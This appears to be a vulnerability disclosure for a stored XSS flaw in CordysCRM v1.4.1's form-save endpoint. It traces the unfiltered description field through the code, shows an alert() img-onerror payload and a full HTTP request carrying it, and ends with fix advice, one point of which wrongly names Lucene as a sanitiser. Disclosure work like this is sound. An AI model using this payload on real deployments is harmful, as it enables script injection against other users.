## Vulnerability Description

The `ModuleFormController` component in CordysCRM v1.4.1 contains a **stored cross-site scripting (XSS)** vulnerability. This vulnerability stems from the `save()` method's failure to adequately validate or encode the `description` parameter when handling requests to save form attributes. A remote attacker could exploit the `/module/form/save` interface to submit malicious JavaScript code. When the form editing function is accessed, the malicious script will execute in its browser environment.

## Vulnerability Analysis

The vulnerability's entry point class file is: src/main/java/cn/cordys/crm/system/controller/ModuleFormController.java


The `save()` method does not perform any XSS filtering; it proceeds to the logic layer for processing.

<img width="1478" height="723" alt="Pasted image 20260514103407" src="https://github.com/user-attachments/assets/583dc3d0-f1bb-4c70-a0e4-3316f91e20f4" />


Form cache class file: src/main/java/cn/cordys/crm/system/service/ModuleFormCacheService.java


Without performing any XSS filtering, proceed to the next layer.

<img width="1471" height="610" alt="Pasted image 20260514103521" src="https://github.com/user-attachments/assets/f0d9e49e-4895-4e01-b048-4dc047b24da8" />


Logic layer class file: src/main/java/cn/cordys/crm/system/service/ModuleFormService.java

The logic layer did not perform any XSS filtering on the incoming form description content. Lines 209 and 213 call database operations to save and update the database. A stored XSS vulnerability exists.

<img width="1492" height="874" alt="Pasted image 20260514103737" src="https://github.com/user-attachments/assets/c8166565-7520-4a89-80c4-f0b37e050591" />


## Vulnerability Reproduction


Enter the follow-up record form settings interface

<img width="1920" height="1007" alt="Pasted image 20260514103846" src="https://github.com/user-attachments/assets/7f911277-6885-4b3c-8e34-8607be13a67b" />


Click on a form field, then in the description information, enter the payload: <img src=x onerror=alert('XSS')>

<img width="1821" height="906" alt="Pasted image 20260514104003" src="https://github.com/user-attachments/assets/eac41191-5638-4e51-90a9-800ac702e07c" />



As soon as you enter the payload, the payload will be triggered and a pop-up window will appear without you even needing to click "save".


<img width="1652" height="884" alt="Pasted image 20260514104121" src="https://github.com/user-attachments/assets/2526b515-9696-43de-959c-7e2ca63aa03c" />



Click the save function to save the payload into the database.

<img width="1652" height="793" alt="Pasted image 20260514104231" src="https://github.com/user-attachments/assets/cfee107e-3480-418f-bc03-e673ee65977c" />


The loaded data packet is as follows:

```http
POST /module/form/save HTTP/1.1
Host: localhost:8081
Content-Length: 6068
X-AUTH-TOKEN: 5b596f77-5942-4eb7-94a4-6b3fefbc2f29
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
CSRF-TOKEN: CYkmuI1mFPB4/AuJqbqVQ1GvBQNqI891/DPRjSiSWZO0COyOcRSal7HBV+vWJ/ZqoEzUK8bbPNvvm7oIVizXDSr1o2X+ni8/MzxaH3GtcA==
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Origin: http://localhost:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8081/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"formKey":"record","formProp":{"viewSize":"large","layout":1,"labelPos":"top","inputWidth":"custom","optBtnPos":"flex-row","optBtnContent":[{"text":"保存","enable":true},{"text":"保存并继续添加","enable":false},{"text":"取消","enable":true}],"linkProp":{"opportunity":[{"key":"OPPORTUNITY_TO_RECORD","linkFields":[]}],"plan":[{"key":"PLAN_TO_RECORD","linkFields":[]}],"clue":[{"key":"CLUE_TO_RECORD","linkFields":[]}],"customer":[{"key":"CUSTOMER_TO_RECORD","linkFields":[]}]}},"fields":[{"id":"909021238272039","name":"跟进类型","internalKey":"recordType","pos":null,"type":"SELECT","mobile":true,"showLabel":true,"placeholder":"XSS_Test","description":"<img src=x onerror=alert('XSS')>","readable":true,"editable":true,"fieldWidth":1,"rules":[{"key":"required","required":true,"message":"common.notNull","label":"common.required","trigger":["change","blur"]}],"showControlRules":[{"value":"CUSTOMER","fieldIds":["909021238272040","909021238272041","909021238272042"]},{"value":"CLUE","fieldIds":["909021238272043"]}],"businessKey":"type","disabledProps":["rules.required","options","mobile","readable"],"resourceFieldId":null,"subTableFieldId":null,"defaultValue":null,"options":[{"value":"CUSTOMER","label":"客户"},{"value":"CLUE","label":"线索"}],"linkProp":null,"dataSourceType":"CUSTOMER","serialNumberRules":["","","yyyyMM","","NaN"]},{"id":"909021238272040","name":"客户名称","internalKey":"recordCustomer","pos":null,"type":"DATA_SOURCE","mobile":true,"showLabel":true,"placeholder":"","description":null,"readable":true,"editable":true,"fieldWidth":1,"rules":[{"key":"required","required":true,"message":"common.notNull","label":"common.required","trigger":["change","blur"]}],"showControlRules":null,"businessKey":"customerId","disabledProps":["readable","mobile","rules.required"],"resourceFieldId":null,"subTableFieldId":null,"dataSourceType":"CUSTOMER","combineSearch":null,"showFields":null,"refFields":null},{"id":"909021238272043","name":"公司名称","internalKey":"recordClue","pos":null,"type":"DATA_SOURCE","mobile":true,"showLabel":true,"placeholder":"","description":null,"readable":true,"editable":true,"fieldWidth":1,"rules":[{"key":"required","required":true,"message":"common.notNull","label":"common.required","trigger":["change","blur"]}],"showControlRules":null,"businessKey":"clueId","disabledProps":["readable","mobile","rules.required"],"resourceFieldId":null,"subTableFieldId":null,"dataSourceType":"CLUE","combineSearch":null,"showFields":null,"refFields":null},{"id":"909021238272041","name":"商机","internalKey":"recordOpportunity","pos":null,"type":"DATA_SOURCE","mobile":true,"showLabel":true,"placeholder":"","description":null,"readable":true,"editable":true,"fieldWidth":1,"rules":[],"showControlRules":null,"businessKey":"opportunityId","disabledProps":[],"resourceFieldId":null,"subTableFieldId":null,"dataSourceType":"OPPORTUNITY","combineSearch":null,"showFields":null,"refFields":null},{"id":"909021238272042","name":"联系人","internalKey":"recordContact","pos":null,"type":"DATA_SOURCE","mobile":true,"showLabel":true,"placeholder":"","description":null,"readable":true,"editable":true,"fieldWidth":1,"rules":[{"key":"required","required":true,"message":"common.notNull","label":"common.required","trigger":["change","blur"]}],"showControlRules":null,"businessKey":"contactId","disabledProps":[],"resourceFieldId":null,"subTableFieldId":null,"dataSourceType":"CONTACT","combineSearch":null,"showFields":null,"refFields":null},{"id":"909021238272044","name":"跟进方式","internalKey":"recordMethod","pos":null,"type":"SELECT","mobile":true,"showLabel":true,"placeholder":"","description":null,"readable":true,"editable":true,"fieldWidth":1,"rules":[{"key":"required","required":true,"message":"common.notNull","label":"common.required","trigger":["change","blur"]}],"showControlRules":null,"businessKey":"followMethod","disabledProps":[],"resourceFieldId":null,"subTableFieldId":null,"defaultValue":null,"options":[{"value":"1","label":"到访"},{"value":"2","label":"电话"}],"linkProp":null},{"id":"909021238272045","name":"跟进时间","internalKey":"recordTime","pos":null,"type":"DATE_TIME","mobile":true,"showLabel":true,"placeholder":"","description":null,"readable":true,"editable":true,"fieldWidth":1,"rules":[{"key":"required","required":true,"message":"common.notNull","label":"common.required","trigger":["change","blur"]}],"showControlRules":null,"businessKey":"followTime","disabledProps":[],"resourceFieldId":null,"subTableFieldId":null,"dateType":"date","dateDefaultType":"custom","defaultValue":null},{"id":"909021238272046","name":"负责人","internalKey":"recordOwner","pos":null,"type":"MEMBER","mobile":true,"showLabel":true,"placeholder":"","description":null,"readable":true,"editable":true,"fieldWidth":1,"rules":[{"key":"required","required":true,"message":"common.notNull","label":"common.required","trigger":["change","blur"]}],"showControlRules":null,"businessKey":"owner","disabledProps":["readable","mobile","rules.required"],"resourceFieldId":null,"subTableFieldId":null,"defaultValue":null,"hasCurrentUser":true,"initialOptions":[]},{"id":"909021238272047","name":"意向产品","internalKey":"recordProduct","pos":null,"type":"DATA_SOURCE_MULTIPLE","mobile":true,"showLabel":true,"placeholder":"","description":null,"readable":true,"editable":true,"fieldWidth":1,"rules":[],"showControlRules":null,"businessKey":null,"disabledProps":null,"resourceFieldId":null,"subTableFieldId":null,"dataSourceType":"PRODUCT","combineSearch":null,"showFields":null,"refFields":null},{"id":"909021238272048","name":"跟进内容","internalKey":"recordDescription","pos":null,"type":"TEXTAREA","mobile":true,"showLabel":true,"placeholder":"","description":null,"readable":true,"editable":true,"fieldWidth":1,"rules":[{"key":"required","required":true,"message":"common.notNull","label":"common.required","trigger":["change","blur"]}],"showControlRules":null,"businessKey":"content","disabledProps":[],"resourceFieldId":null,"subTableFieldId":null,"defaultValue":null}]}

```

<img width="1917" height="895" alt="Pasted image 20260514104623" src="https://github.com/user-attachments/assets/4693514d-b11f-4160-b248-4af29ff3b7b0" />


After saving, return to the previous screen and click to enter again.

<img width="1869" height="985" alt="Pasted image 20260514104306" src="https://github.com/user-attachments/assets/02eb9596-f234-4da6-8712-d30c95405e7a" />


The payload was triggered again and was indeed saved to the database. A stored XSS vulnerability exists; vulnerability reproduction complete.


<img width="1787" height="789" alt="Pasted image 20260514104319" src="https://github.com/user-attachments/assets/6577044d-5aef-4785-ace4-4202da86faa2" />


## Repair suggestions

Input Filtering: Use a security library (such as Java's AntiSamy or Lucene) in the backend to whitelist submitted HTML content, removing dangerous tags and attributes such as `script` and `onmouseover`.

Output Escaping: Ensure variables are HTML entity encoded when rendering announcement content in the frontend template.

Content Security Policy (CSP): Configure an appropriate CSP policy to restrict the execution of inline scripts.
